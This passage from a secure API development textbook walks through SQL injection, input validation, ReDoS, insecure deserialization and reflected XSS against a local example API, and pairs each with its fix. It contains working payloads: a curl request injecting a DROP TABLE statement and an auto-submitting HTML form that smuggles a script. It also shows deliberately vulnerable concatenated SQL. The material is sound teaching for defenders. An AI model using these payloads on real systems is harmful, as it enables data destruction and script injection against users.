If you implement your API in a dynamic language, your language may have a built-in eval   function to evaluate a string as code, and passing unvalidated user input into such a function would be a very dangerous thing to do, because it may allow the user to execute arbitrary code with the full permissions of your application. But there are many cases in which you are evaluating code that may not be as obvious as calling an explicit eval function, such as:   Building an SQL command or query to send to a database  Running an operating system command  Performing a lookup in an LDAP directory  Sending an HTTP request to another API  Generating an HTML page to send to a web browser  If user input is included in any of these cases in an uncontrolled way, the user may be able to influence the command or query to have unintended effects. This type of vul- nerability is known as an injection attack and is often qualified with the type of code being injected: SQL injection  or SQLi , LDAP injection, and so on.   The Natter createSpace operation is vulnerable to a SQL injection attack because it constructs the command to create the new social space by concatenating user input directly into a string. The result is then sent to the database where it will be interpreted   Injection attacks  41  Header and log injection There are examples of injection vulnerabilities that do not involve code being exe- cuted at all. For example, HTTP headers are lines of text separated by carriage return and new line characters  "\r\n" in Java . If you include unvalidated user input in a HTTP header then an attacker may be able to add a "\r\n" character sequence and then inject their own HTTP headers into the response. The same can happen when you  include  user-controlled  data  in  debug  or  audit  log  messages   see  chapter  3 , allowing an attacker to inject fake log messages into the log file to confuse somebody later attempting to investigate an attack.  as a SQL command. Because the syntax of the SQL command is a string and the user input is a string, the database has no way to tell the difference.    This confusion is what allows an attacker to gain control. The offending line from the code is the following, which concatenates the user-supplied space name and owner into the SQL INSERT statement:          database.updateUnique              "INSERT INTO spaces space_id, name, owner  " +                 "VALUES " + spaceId + ", '" + spaceName +                 "', '" + owner + "' ;" ;  The spaceId is a numeric value that is created by your application from a sequence, so that is relatively safe, but the other two variables come directly from the user. In this case, the input comes from the JSON payload, but it could equally come from query parameters in the URL itself. All types of requests are potentially vulnerable to injec- tion attacks, not just POST methods that include a payload.   In SQL, string values are surrounded by single quotes and you can see that the code  takes  care  to  add  these  around  the  user  input.  But  what  happens  if  that  user input itself contains a single quote? Let’s try it and see:  $ curl -i -d "{\"name\": \"test'space\", \"owner\": \"demo\"}"  ➥ http:  localhost:4567 spaces  HTTP 1.1 500 Server Error Date: Wed, 30 Jan 2019 16:39:04 GMT Content-Type: text html;charset=utf-8 Transfer-Encoding: chunked Server: Jetty 9.4.8.v20171121   {"error":"internal server error"}  You get one of those terrible 500 internal server error responses. If you look at the server logs, you can see why:  org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "INSERT INTO   spaces space_id, name, owner  VALUES 4, 'test'space', 'demo[*]' ;";   42  CHAPTER 2 Secure API development  The single quote you included in your input has ended up causing a syntax error in the  SQL  expression.  What  the  database  sees  is the  string  'test',  followed by some extra  characters   “space”   and  then  another  single  quote.  Because  this  is  not  valid SQL syntax, it complains and aborts the transaction. But what if your input ends up being valid SQL? In that case the database will execute it without complaint. Let’s try running the following command instead:  $ curl -i -d "{\"name\": \"test\",\"owner\":  ➥  \"' ; DROP TABLE spaces; --\"}" http:  localhost:4567 spaces HTTP 1.1 201 Created Date: Wed, 30 Jan 2019 16:51:06 GMT Location:  spaces 9 Content-Type: application json Transfer-Encoding: chunked Server: Jetty 9.4.8.v20171121   {"name":"', '' ; DROP TABLE spaces; --","uri":" spaces 9"}  The operation completed successfully with no errors, but let’s see what happens when you try to create another space:  $ curl -d '{"name": "test space", "owner": "demo"}'  ➥ http:  localhost:4567 spaces {"error":"internal server error"}  If you look in the logs again, you find the following:  org.h2.jdbc.JdbcSQLException: Table "SPACES" not found;  Oh dear. It seems that by passing in carefully crafted input your user has managed to delete  the  spaces  table  entirely,  and  your  whole  social  network  with  it!  Figure  2.5 shows  what  the  database  saw  when  you  executed  the  first  curl  command  with  the funny owner name. Because the user input values are concatenated into the SQL as strings, the database ends up seeing a single string that appears to contain two different statements: the INSERT statement we intended, and a DROP TABLE statement that the  INSERT INTO spaces space_id, name, owner  VALUES   12  , ‘  test  ‘, ‘  ‘ ; DROP TABLE spaces; --  ‘ ;  spaceId  name  Becomes  owner  INSERT INTO spaces space_id, name, owner  VALUES 12, ‘test’, ‘’ ; DROP TABLE spaces; -- ‘ ;  Figure 2.5 A SQL injection attack occurs when user input is mixed into a SQL statement without  the database being able to tell them apart. To the database, this SQL command with a funny  owner name ends up looking like two separate statements followed by a comment.   Injection attacks  43  attacker has managed to inject. The first character of the owner name is a single quote character, which closes the open quote inserted by our code. The next two characters are a close parenthesis and a semicolon, which together ensure that the INSERT state- ment  is  properly  terminated.  The  DROP  TABLE  statement  is  then  inserted   injected  after  the  INSERT  statement.  Finally,  the  attacker  adds  another  semicolon  and  two hyphen characters, which starts a comment in SQL. This ensures that the final close quote and parenthesis inserted by the code are ignored by the database and do not cause a syntax error.   When these elements are put together, the result is that the database sees two valid SQL statements: one that inserts a dummy row into the spaces table, and then another that destroys that table completely. Figure 2.6 is a famous cartoon from the XKCD web comic that illustrates the real-world problems that SQL injection can cause.  Figure 2.6 The consequences of failing to handle SQL injection attacks.  Credit: XKCD, “Exploits of a Mom,”  https:  www.xkcd.com 327 .   2.4.1  Preventing injection attacks There are a few techniques that you can use to prevent injection attacks. You could try escaping any special characters in the input to prevent them having an effect. In this case, for example, perhaps you could escape or remove the single-quote characters. This approach is often ineffective because different databases treat different charac- ters specially and use different approaches to escape them. Even worse, the set of spe- cial characters can change from release to release, so what is safe at one point in time might not be so safe after an upgrade.   A better approach is to strictly validate all inputs to ensure that they only contain characters that you know to be safe. This is a good idea, but it’s not always possible to eliminate all invalid characters. For example, when inserting names, you can’t avoid single quotes, otherwise you might forbid genuine names such as Mary O’Neill.    The  best  approach  is  to  ensure  that  user  input  is  always  clearly  separated  from dynamic  code  by  using  APIs  that  support  prepared  statements.  A  prepared  statement allows you to write the command or query that you want to execute with placeholders   44  CHAPTER 2 Secure API development  in it for user input, as shown in figure 2.7. You then separately pass the user input val- ues and the database API ensures they are never treated as statements to be executed.  Prepared statement with placeholder values  Placeholders  INSERT INTO spaces space_id, name, owner  VALUES ?, ?, ? ;  12  test  1  2  3  Actual parameter values are always kept separate  ‘ ; DROP TABLE spaces; --  Figure 2.7 A prepared statement ensures that user input values are  always kept separate from the SQL statement itself. The SQL statement  only contains placeholders  represented as question marks  and is parsed  and compiled in this form. The actual parameter values are passed to the  database separately, so it can never be confused into treating user input  as SQL code to be executed.  DEFINITION A prepared statement is a SQL statement with all user input replaced with placeholders. When the statement is executed the input values are sup- plied separately, ensuring the database can never be tricked into executing user input as code.  Listing 2.6 shows the createSpace code updated to use a prepared statement. Dales- bred has built-in support for prepared statements by simply writing the statement with placeholder values and then including the user input as extra arguments to the update- Unique method call. Open the SpaceController.java file in your text editor and find the createSpace method. Update the code to match the code in listing 2.6, using a prepared statement rather than manually concatenating strings together. Save the file once you are happy with the new code.  Listing 2.6 Using prepared statements  public JSONObject createSpace Request request, Response response        throws SQLException {     var json = new JSONObject request.body   ;     var spaceName = json.getString "name" ;     var owner = json.getString "owner" ;      return database.withTransaction tx -> {       var spaceId = database.findUniqueLong            "SELECT NEXT VALUE FOR space_id_seq;" ;   Injection attacks  45        database.updateUnique            "INSERT INTO spaces space_id, name, owner  " +                       "VALUES ?, ?, ? ;", spaceId, spaceName, owner ;           response.status 201 ;       response.header "Location", " spaces " + spaceId ;        return new JSONObject             .put "name", spaceName            .put "uri", " spaces " + spaceId ;     } ;  Use placeholders  in the SQL  statement and  pass the values as  additional  arguments.  Now when your statement is executed, the database will be sent the user input sepa- rately from the query, making it impossible for user input to influence the commands that get executed. Let’s see what happens when you run your malicious API call. This time the space gets created correctly—albeit with a funny name!  $ curl -i -d "{\"name\": \"', '' ; DROP TABLE spaces; --\",  ➥ \"owner\": \"\"}" http:  localhost:4567 spaces HTTP 1.1 201 Created Date: Wed, 30 Jan 2019 16:51:06 GMT Location:  spaces 10 Content-Type: application json Transfer-Encoding: chunked Server: Jetty 9.4.8.v20171121   {"name":"', '' ; DROP TABLE spaces; --","uri":" spaces 10"}  Prepared statements in SQL eliminate the possibility of SQL injection attacks if used consistently. They also can have a performance advantage because the database can compile the query or statement once and then reuse the compiled code for many dif- ferent inputs; there is no excuse not to use them. If you’re using an object-relational mapper  ORM  or other abstraction layer over raw SQL commands, check the docu- mentation to make sure that it’s using prepared statements under the hood. If you’re using a non-SQL database, check to see whether the database API supports parameter- ized calls that you can use to avoid building commands through string concatenation.  2.4.2 Mitigating SQL injection with permissions  While prepared statements should be your number one defense against SQL injection attacks, another aspect of the attack worth mentioning is that the database user didn’t need to have permissions to delete tables in the first place. This is not an operation that you would ever require your API to be able to perform, so we should not have granted it the ability to do so in the first place. In the H2 database you are using, and in most databases, the user that creates a database schema inherits full permissions to alter the tables and other objects in that database. The principle of least authority says that you should only grant users and processes the fewest permissions that they need to  get their job done and  no more. Your  API does not  ever need to drop  database tables, so you should not grant it the ability to do so. Changing the permissions will   46  CHAPTER 2 Secure API development  not prevent SQL injection attacks, but it means that if an SQL injection attack is ever found, then the consequences will be contained to only those actions you have explic- itly allowed.  PRINCIPLE The principle of least authority  POLA , also known as the principle of least privilege, says that all users and processes in a system should be given only those permissions that they need to do their job—no more, and no less.  To reduce the permissions that your API runs with, you could try and remove permis- sions that you do not need  using the SQL REVOKE command . This runs the risk that you might accidentally forget to revoke some powerful permissions. A safer alternative is to create a new user and only grant it exactly the permissions that it needs. To do this, we can use the SQL standard CREATE USER and GRANT commands, as shown in list- ing 2.7. Open the schema.sql file that you created earlier in your text editor and add the commands shown in the listing to the bottom of the file. The listing first creates a new database user and then grants it just the ability to perform  SELECT and  INSERT statements on our two database tables.  Listing 2.7 Creating a restricted database user  CREATE USER natter_api_user PASSWORD 'password';      GRANT SELECT, INSERT ON spaces, messages TO natter_api_user;     Create the new  database user.  Grant just the permissions it needs.  We then need to update our Main class to switch to using this restricted user after the database schema has been loaded. Note that we cannot do this before the database schema is loaded, otherwise we would not have enough permissions to create the data- base! We can do this by simply reloading the JDBC DataSource object after we have created the schema, switching to the new user in the process. Locate and open the Main.java file in your editor again and navigate to the start of the main method where you initialize the database. Change the few lines that create and initialize the database to the following lines instead:  var datasource = JdbcConnectionPool.create                "jdbc:h2:mem:natter", "natter", "password" ;      var database = Database.forDataSource datasource ;    createTables database ;                               datasource = JdbcConnectionPool.create                            "jdbc:h2:mem:natter", "natter_api_user", "password" ;       database = Database.forDataSource datasource ;               Initialize the  database schema as  the privileged user.  Switch to the natter_  api_user and recreate  the database objects.  Here you create and initialize the database using the “natter” user as before, but you then  recreate  the  JDBC  connection  pool  DataSource  passing  in  the  username  and password  of  your  newly  created  user.  In  a  real  project,  you  should  be  using  more secure passwords than password, and you’ll see how to inject more secure connection passwords in chapter 10.   Input validation  47    If  you  want  to  see  the  difference  this  makes,  you  can  temporarily  revert  the changes you made previously to use prepared statements. If you then try to carry out the SQL injection attack as before, you will see a 500 error. But this time when you check the logs, you will see that the attack was not successful because the DROP TABLE command was denied due to insufficient permissions:  Caused by: org.h2.jdbc.JdbcSQLException: Not enough rights for object   "PUBLIC.SPACES"; SQL statement:   DROP TABLE spaces; --' ; [90096-197]  Pop quiz 1 Which one of the following is not in the 2017 OWASP Top 10?

For example, you might assume that an input can never be more than a certain size. If you’re using a language like C or   48  CHAPTER 2 Secure API development  C++ that lacks memory safety, then failing to check this assumption can lead to a seri- ous class of attacks known as buffer overflow attacks. Even in a memory-safe language, failing  to  check  that  the  inputs  to  an  API  match  the  developer’s  assumptions  can result in unwanted behavior.  DEFINITION A buffer overflow or buffer overrun occurs when an attacker can sup- ply input that exceeds the size of the memory region allocated to hold that input. If the program, or the language runtime, fails to check this case then the attacker may be able to overwrite adjacent memory.  A  buffer  overflow  might  seem  harmless  enough;  it  just  corrupts  some  memory,  so maybe we get an invalid value in a variable, right? However, the memory that is over- written may not always be simple data and, in some cases, that memory may be inter- preted as code, resulting in a remote code execution vulnerability. Such vulnerabilities are extremely serious, as the attacker can usually then run code in your process with the full permissions of your legitimate code.  DEFINITION Remote  code  execution   RCE   occurs  when  an  attacker  can  inject code into a remotely running API and cause it to execute. This can allow the attacker to perform actions that would not normally be allowed.  In the Natter API code, the input to the API call is presented as structured JSON. As Java is a memory-safe language, you don’t need to worry too much about buffer over- flow  attacks.  You’re  also  using  a  well-tested  and  mature  JSON  library  to  parse  the input, which eliminates a lot of problems that can occur. You should always use well- established formats and libraries for processing all input to your API where possible. JSON is much better than the complex XML formats it replaced, but there are still often significant differences in how different libraries parse the same JSON.  Input parsing is a very common source of security vulnerabilities, LEARN MORE and  many  widely  used  input  formats  are  poorly  specified,  resulting  in  differ- ences in how they are parsed by different libraries. The LANGSEC movement  http:  langsec.org  argues for the use of simple and unambiguous input for- mats and automatically generated parsers to avoid these issues.  Insecure deserialization Although  Java  is  a  memory-safe  language  and  so  less  prone  to  buffer  overflow attacks, that does not mean it is immune from RCE attacks. Some serialization librar- ies that convert arbitrary Java objects to and from string or binary formats have turned out to be vulnerable to RCE attacks, known as an insecure deserialization vulnerability in the OWASP Top 10. This affects Java’s built-in Serializable framework, but also parsers for supposedly safe formats like JSON have been vulnerable, such as the popular  Jackson  Databind. a  The  problem  occurs  because  Java  will  execute  code within the default constructor of any object being deserialized by these frameworks.   Input validation  49  Some classes included with popular Java libraries perform dangerous operations in their constructors, including reading and writing files and performing other actions. Some  classes  can  even  be  used  to  load  and  execute  attacker-supplied  bytecode directly. Attackers can exploit this behavior by sending a carefully crafted message that causes the vulnerable class to be loaded and executed.  The solution to these problems is to allowlist a known set of safe classes and refuse to deserialize any other class. Avoid frameworks that do not allow you to control which classes are deserialized. Consult the OWASP Deserialization Cheat Sheet for advice on avoid insecure deserialization vulnerabilities in several programming languages: https:  cheatsheetseries.owasp.org cheatsheets Deserialization_Cheat_Sheet.html. You should take extra care when using a complex input format such as XML, because there  are  several  specific  attacks  against  such  formats.  OWASP  maintains  cheat sheets for secure processing of XML and other attacks, which you can find linked from the deserialization cheat sheet.  a See  https:  adamcaudill.com 2017 10 04 exploiting-jackson-rce-cve-2017-7525   for  a description of the vulnerability. The vulnerability relies on a feature of Jackson that is dis- abled by default.  Although  the  API  is  using  a  safe  JSON  parser,  it’s  still  trusting  the  input  in  other regards. For example, it doesn’t check whether the supplied username is less than the 30-character maximum configured in the database schema. What happens you pass in a longer username?  $ curl -d '{"name":"test", "owner":"a really long username ➥ that is more than 30 characters long"}'   ➥ http:  localhost:4567 spaces -i HTTP 1.1 500 Server Error Date: Fri, 01 Feb 2019 13:28:22 GMT Content-Type: application json Transfer-Encoding: chunked Server: Jetty 9.4.8.v20171121   {"error":"internal server error"}  If you look in the server logs, you see that the database constraint caught the problem:  Value too long for column "OWNER VARCHAR 30  NOT NULL"  But you shouldn’t rely on the database to catch all errors. A database is a valuable asset that  your  API  should  be  protecting  from  invalid  requests.  Sending  requests  to  the database that contain basic errors just ties up resources that you would rather use pro- cessing genuine requests. Furthermore, there may be additional constraints that are harder to express in a database schema. For example, you might require that the user exists in the corporate LDAP directory. In listing 2.8, you’ll add some basic input vali- dation to ensure that usernames are at most 30 characters long, and space names up   50  CHAPTER 2 Secure API development  to 255 characters. You’ll also ensure that usernames contain only alphanumeric char- acters, using a regular expression.   PRINCIPLE Always define acceptable inputs rather than unacceptable ones when val- idating untrusted input. An allow list describes exactly which inputs are con- sidered valid and rejects anything else.1 A blocklist  or deny list , on the other hand,  tries  to  describe  which  inputs  are  invalid  and  accepts  anything  else. Blocklists can lead to security flaws if you fail to anticipate every possible mali- cious input. Where the range of inputs may be large and complex, such as Unicode text, consider listing general classes of acceptable inputs like “deci- mal digit” rather than individual input values.  Open the SpaceController.java file in your editor and find the createSpace method again. After each variable is extracted from the input JSON, you will add some basic validation. First, you’ll ensure that the spaceName is shorter than 255 characters, and then you’ll validate the owner username matches the following regular expression:  [a-zA-Z][a-zA-Z0-9]{1,29}  That is, an uppercase or lowercase letter followed by between 1 and 29 letters or dig- its. This is a safe basic alphabet for usernames, but you may need to be more flexible if you need to support international usernames or email addresses as usernames.  Listing 2.8 Validating inputs    public String createSpace Request request, Response response        throws SQLException {     var json = new JSONObject request.body   ;     var spaceName = json.getString "name" ;     if  spaceName.length   > 255  {                      throw new IllegalArgumentException "space name too long" ;     }     var owner = json.getString "owner" ;     if  !owner.matches "[a-zA-Z][a-zA-Z0-9]{1,29}"   {                         throw new IllegalArgumentException "invalid username: " + owner ;     }     ..   }  Here we use a regular expression to ensure the username is valid.  Check that the space  name is not too long.  Regular expressions are a useful tool for input validation, because they can succinctly express complex constraints on the input. In this case, the regular expression ensures that the username consists only of alphanumeric characters, doesn’t start with a num- ber, and is between 2 and 30 characters in length. Although powerful, regular expres- sions can themselves be a source of attack. Some regular expression implementations can be made to consume large amounts of CPU time when processing certain inputs,  1 You may hear the older terms whitelist and blacklist used for these concepts, but these words can have negative connotations and should be avoided. See https:  www.ncsc.gov.uk blog-post terminology-its-not-black-and- white for a discussion.   Input validation  51  leading to an attack known as a regular expression denial of service  ReDoS  attack  see sidebar .  ReDoS Attacks A regular expression denial of service  or ReDoS  attack occurs when a regular expres- sion can be forced to take a very long time to match a carefully chosen input string. This can happen if the regular expression implementation can be forced to back-track many times to consider different possible ways the expression might match.  As an example, the regular expression ^ aaa +$ can match a long string of a char- acters  using  a  repetition  of  either  of  the  two  branches.  Given  the  input  string “aaaaaaaaaaaaab” it might first try matching a long sequence of single a characters, then when that fails  when it sees the b at the end  it will try matching a sequence of single  a  characters  followed  by  a  double-a   aa   sequence,  then  two  double-a sequences, then three, and so on. After it has tried all those it might try interleaving single-a and double-a sequences, and so on. There are a lot of ways to match this input, and so the pattern matcher may take a very long time before it gives up. Some regular expression implementations are smart enough to avoid these problems, but many popular programming languages  including Java  are not.a Design your regular expressions  so  that  there  is  always  only  a  single  way  to  match  any  input.  In  any repeated part of the pattern, each input string should only match one of the alterna- tives. If you’re not sure, prefer using simpler string operations instead.  a  Java 11 appears to be less susceptible to these attacks than earlier versions.  If you compile and run this new version of the API, you’ll find that you still get a 500 error, but at least you are not sending invalid requests to the database anymore. To communicate a more descriptive error back to the user, you can install a Spark excep- tion handler in your Main class, as shown in listing 2.9. Go back to the Main.java file in your editor and navigate to the end of the main method. Spark exception handlers are registered by calling the Spark.exception   method, which we have already stati- cally imported. The method takes two arguments: the exception class to handle, and then  a  handler  function  that  will  take  the  exception,  the  request,  and  the  response objects. The handler function can then use the response object to produce an appropri- ate  error  message.  In  this  case,  you  will  catch  IllegalArgumentException  thrown  by our validation code, and JSONException thrown by the JSON parser when given incor- rect input. In both cases, you can use a helper method to return a formatted 400 Bad Request error to the user. You can also return a 404 Not Found result when a user tries to access a space that doesn’t exist by catching Dalesbred’s EmptyResultException.  Listing 2.9 Handling exceptions  import org.dalesbred.result.EmptyResultException;     import spark.*;                                        Add required  imports.  public class Main {   52  CHAPTER 2 Secure API development  Also handle exceptions from the JSON parser.    public static void main String... args  throws Exception {     ..     exception IllegalArgumentException.class,                Main::badRequest ;     exception JSONException.class,            Main::badRequest ;     exception EmptyResultException.class,                            e, request, response  -> response.status 404  ;      }   private static void badRequest Exception ex,       Request request, Response response  {     response.status 400 ;     response.body "{\"error\": \"" + ex + "\"}" ;   }   .. }  Install an exception  handler to signal invalid  inputs to the caller as  HTTP 400 errors.  Return 404  Not Found for  Dalesbred empty  result exceptions.  Now the user gets an appropriate error if they supply invalid input:  $ curl -d '{"name":"test", "owner":"a really long username  ➥ that is more than 30 characters long"}'   ➥ http:  localhost:4567 spaces -i  HTTP 1.1 400 Bad Request Date: Fri, 01 Feb 2019 15:21:16 GMT Content-Type: text html;charset=utf-8 Transfer-Encoding: chunked Server: Jetty 9.4.8.v20171121   {"error": "java.lang.IllegalArgumentException: invalid username: a really   long username that is more than 30 characters long"}  Pop quiz 3 Given the following code for processing binary data received from a user  as a  java.nio.ByteBuffer :    int msgLen = buf.getInt  ;   byte[] msg = new byte[msgLen];   buf.get msg ;  and recalling from the start of section 2.5 that Java is a memory-safe language, what is the main vulnerability an attacker could exploit in this code?  a Passing a negative message length b Passing a very large message length c Passing an invalid value for the message length d Passing a message length that is longer than the buffer size e Passing a message length that is shorter than the buffer size  The answer is at the end of the chapter.   Producing safe output  53  2.6  Producing safe output In addition to validating all inputs, an API should also take care to ensure that the out- puts  it  produces  are  well-formed  and  cannot  be  abused.  Unfortunately,  the  code you’ve written so far does not take care of these details. Let’s have a look again at the output you just produced:  HTTP 1.1 400 Bad Request Date: Fri, 01 Feb 2019 15:21:16 GMT Content-Type: text html;charset=utf-8 Transfer-Encoding: chunked Server: Jetty 9.4.8.v20171121   {"error": "java.lang.IllegalArgumentException: invalid username: a really   long username that is more than 30 characters long"}  There are three separate problems with this output as it stands:  1  2  It includes details of the exact Java exception that was thrown. Although not a vulnerability by itself, these kinds of details in outputs help a potential attacker to learn what technologies are being used to power an API. The headers are also leaking the version of the Jetty webserver that is being used by Spark under the hood. With these details the attacker can try and find known vulnerabilities to exploit. Of course, if there are vulnerabilities then they may find them any- way, but you’ve made their job a lot easier by giving away these details. Default error  pages  often  leak  not  just  class  names,  but  full  stack  traces  and  other debugging information. It echoes back the erroneous input that the user supplied in the response and doesn’t  do  a  good  job  of  escaping  it.  When  the  API  client  might  be  a  web browser,  this  can  result  in  a  vulnerability  known  as  reflected  cross-site  scripting  XSS . You’ll see how an attacker can exploit this in section 2.6.1.  3 The Content-Type header in the response is set to text html rather than the expected application json. Combined with the previous issue, this increases the chance that an XSS attack could be pulled off against a web browser client.  You can fix the information leaks in point 1 by simply removing these fields from the response. In Spark, it’s unfortunately rather difficult to remove the Server header com- pletely, but you can set it to an empty string in a filter to remove the information leak:      afterAfter  request, response  ->           response.header "Server", ""  ;  You can remove the leak of the exception class details by changing the exception han- dler  to  only  return  the  error  message  not  the  full  class.  Change  the  badRequest method you added earlier to only return the detail message from the exception.    private static void badRequest Exception ex,       Request request, Response response  {   54  CHAPTER 2 Secure API development      response.status 400 ;     response.body "{\"error\": \"" + ex.getMessage   + "\"}" ;   }  Cross-Site Scripting Cross-site scripting, or XSS, is a common vulnerability affecting web applications, in which an attacker can cause a script to execute in the context of another site. In a persistent XSS, the script is stored in data on the server and then executed whenever a user accesses that data through the web application. A reflected XSS occurs when a maliciously crafted input to a request causes the script to be included  reflected  in the response to that request. Reflected XSS is slightly harder to exploit because a victim has to be tricked into visiting a website under the attacker’s control to trigger the attack. A third type of XSS, known as DOM-based XSS, attacks JavaScript code that dynamically creates HTML in the browser.  These can be devastating to the security of a web application, allowing an attacker to potentially steal session cookies and other credentials, and to read and alter data in that session. To appreciate why XSS is such a risk, you need to understand that the security model of web browsers is based on the same-origin policy  SOP . Scripts executing within the same origin  or same site  as a web page are, by default, able to read cookies set by that website, examine HTML elements created by that site, make network requests to that site, and so on, although scripts from other origins are blocked from doing those things. A successful XSS allows an attacker to execute their script as if it came from the target origin, so the malicious script gets to do all the same things that the genuine scripts from that origin can do. If I can successfully exploit an XSS vulnerability on facebook.com, for example, my script could potentially read and alter your Facebook posts or steal your private messages.  Although XSS is primarily a vulnerability in web applications, in the age of single-page apps  SPAs  it’s common for web browser clients to talk directly to an API. For this reason, it’s essential that an API take basic precautions to avoid producing output that might be interpreted as a script when processed by a web browser.  2.6.1  Exploiting XSS Attacks To understand the XSS attack, let’s try to exploit it. Before you can do so, you may need to add a special header to your response to turn off built-in protections in some browsers that will detect and prevent reflected XSS attacks. This protection used to be widely  implemented  in  browsers  but  has  recently  been  removed  from  Chrome  and Microsoft  Edge.2  If  you’re  using  a  browser  that  still  implements  it,  this  protection makes it harder to pull off this specific attack, so you’ll disable it by adding the follow- ing header filter to your Main class  an afterAfter filter in Spark runs after all other  2 See https:  scotthelme.co.uk edge-to-remove-xss-auditor  for a discussion of the implications of Microsoft’s announcement. Firefox never implemented the protections in the first place, so this protection will soon be gone from most major browsers. At the time of writing, Safari was the only browser I found that blocked the attack by default.   Producing safe output  55  filters, including exception handlers . Open the Main.java file in your editor and add the following lines to the end of the main method:      afterAfter  request, response  -> {       response.header "X-XSS-Protection", "0" ;     } ;  The X-XSS-Protection header is usually used to ensure browser protections are turned on, but in this case, you’ll turn them off temporarily to allow the bug to be exploited.   NOTE The  XSS  protections  in  browsers  have  been  found  to  cause  security vulnerabilities of their own in some cases. The OWASP project now recom- mends  always  disabling  the  filter  with  the  X-XSS-Protection:  0  header  as shown previously.  With that done, you can create a malicious HTML file that exploits the bug. Open your text editor and create a file called xss.html and copy the contents of listing 2.10 into it. Save the file and double-click on it or otherwise open it in your web browser. The file includes a HTML form with the enctype attribute set to text plain. This instructs the web browser to format the fields in the form as plain text field=value pairs, which you are exploiting to make the output look like valid JSON. You should also include a small piece of JavaScript to auto-submit the form as soon as the page loads.  Listing 2.10 Exploiting a reflected XSS              <form id="test" action="http:  localhost:4567 spaces"          method="post" enctype="text plain">            <input type="hidden" name='{"x":"'             value='","name":"x", ➥ "owner":"&lt;script&gt;alert &apos;XSS!&apos; ; ➥ &lt; script&gt;"}'  >                                     document.getElementById "test" .submit  ;                 The form is configured to POST  with Content-Type text plain.  You carefully craft the form  input to be valid JSON with a  script in the “owner” field.  Once the page loads, you  automatically submit the  form using JavaScript.  If all goes as expected, you should get a pop-up in your browser with the “XSS” message. So, what happened? The sequence of events is shown in figure 2.8, and is as follows:  1 When the form is submitted, the browser sends a POST request to http:   local- host:4567 spaces  with  a  Content-Type  header  of  text plain  and  the  hidden form field as the value. When the browser submits the form, it takes each form element  and  submits  them  as  name=value  pairs.  The  &lt;,  &gt;  and  &apos; HTML entities are replaced with the literal values  , and ' respectively.   56  CHAPTER 2 Secure API development  2 The name of your hidden input field is  '{"x":"', although the value is your long malicious script. When the two are put together the API will see the follow- ing form input:  {"x":"=","name":"x","owner":" alert 'XSS!' ; "}  3 The API sees a valid JSON input and ignores the extra “x” field  which you only added to cleverly hide the equals sign that the browser inserted . But the API rejects the username as invalid, echoing it back in the response:  {"error": "java.lang.IllegalArgumentException: invalid username:    alert 'XSS!' ; "}  4 Because  your  error  response  was  served  with  the  default  Content-Type  of text html, the browser happily interprets the response as HTML and executes the script, resulting in the XSS popup.

Natter API  Figure 2.8 A reflected cross-site scripting  XSS  attack against your API can occur when an attacker  gets a web browser client to submit a form with carefully crafted input fields. When submitted, the  form looks like valid JSON to the API, which parses it but then produces an error message. Because  the response is incorrectly returned with a HTML content-type, the malicious script that the attacker  provided is executed by the web browser client.   Producing safe output  57  Developers sometimes assume that if they produce valid JSON output then XSS is not a threat to a REST API. In this case, the API both consumed and produced valid JSON and yet it was possible for an attacker to exploit an XSS vulnerability anyway.  2.6.2  Preventing XSS  So, how do you fix this? There are several steps that can be taken to avoid your API being used to launch XSS attacks against web browser clients:   Be strict in what you accept. If your API consumes JSON input, then require that all requests include a Content-Type header set to application json. This prevents the form submission tricks that you used in this example, as a HTML form cannot submit application json content.   Ensure all outputs are well-formed using a proper JSON library rather than by  concatenating strings.   Produce correct Content-Type headers on all your API’s responses, and never assume the defaults are sensible. Check error responses in particular, as these are often configured to produce HTML by default.    If you parse the Accept header to decide what kind of output to produce, never simply copy the value of that header into the response. Always explicitly specify the Content-Type that your API has produced.  Additionally,  there  are  some  standard  security  headers  that  you  can  add  to  all  API responses to add additional protection for web browser clients  see table 2.1 .  Table 2.1 Useful security headers  Security header  Description  Comments  X-XSS-Protection  Tells the browser  whether to block ignore  suspected XSS attacks.  The current guidance is to set to “0” on API  responses to completely disable these protections  due to security issues they can introduce.  X-Content-Type- Options  X-Frame-Options  Set to nosniff to pre- vent the browser guess- ing the correct Content- Type.  Set to DENY to prevent  your API responses being  loaded in a frame or  iframe.  Without this header, the browser may ignore your  Content-Type header and guess  sniff  what the  content really is. This can cause JSON output to be  interpreted as HTML or JavaScript, so always add  this header.  In an attack known as drag ‘n’ drop clickjacking,  the attacker loads a JSON response into a hidden  iframe and tricks a user into dragging the data into  a frame controlled by the attacker, potentially  revealing sensitive information. This header pre- vents this attack in older browsers but has been  replaced by Content Security Policy in newer  browsers  see below . It is worth setting both  headers for now.   58  CHAPTER 2 Secure API development  Table 2.1 Useful security headers  continued   Security header  Description  Comments  Cache-Control  and Expires  Controls whether brows- ers and proxies can  cache content in the  response and for  how long.  These headers should always be set correctly to  avoid sensitive data being retained in the browser  or network caches. It can be useful to set default  cache headers in a before   filter, to allow spe- cific endpoints to override it if they have more  specific caching requirements. The safest default is  to disable caching completely using the no-store  directive and then selectively re-enable caching for  individual requests if necessary. The Pragma:  no-cache header can be used to disable caching  for older HTTP 1.0 caches.  Modern web browsers also support the Content-Security-Policy header  CSP  that can be used to reduce the scope for XSS attacks by restricting where scripts can be loaded from and what they can do. CSP is a valuable defense against XSS in a web application. For a REST API, many of the CSP directives are not applicable but it is worth including a minimal CSP header on your API responses so that if an attacker does manage to exploit an XSS vulnerability they are restricted in what they can do. Table 2.2 lists the directives I recommend for a HTTP API. The recommended header for a HTTP API response is:  Content-Security-Policy: default-src 'none';  ➥  frame-ancestors 'none'; sandbox  Table 2.2 Recommended CSP directives for REST responses  Directive  Value  Purpose  default-src  'none'  Prevents the response from loading any scripts or resources.  frame-ancestors  'none'  A replacement for X-Frame-Options, this prevents the response  being loaded into an iframe.  sandbox  n a  Disables scripts and other potentially dangerous content from being  executed.  2.6.3  Implementing the protections You should now update the API to implement these protections. You’ll add some filters that run before and after each request to enforce the recommended security settings.     First,  add  a  before    filter  that  runs  before  each  request  and  checks  that  any POST body submitted to the API has a correct Content-Type header of application  json. The Natter API only accepts input from POST requests, but if your API handles other request methods that may contain a body  such as PUT or PATCH requests , then you should also enforce this filter for those methods. If the content type is incor- rect, then you should return a 415 Unsupported Media Type status, because this is the   Producing safe output  59  standard status code for this case. You should also explicitly indicate the UTF-8 character- encoding in the response, to avoid tricks for stealing JSON data by specifying a different encoding such as UTF-16BE  see https:  portswigger.net blog json-hijacking-for-the- modern-web for details .   Secondly, you’ll add a filter that runs after all requests to add our recommended security headers to the response. You’ll add this as a Spark afterAfter   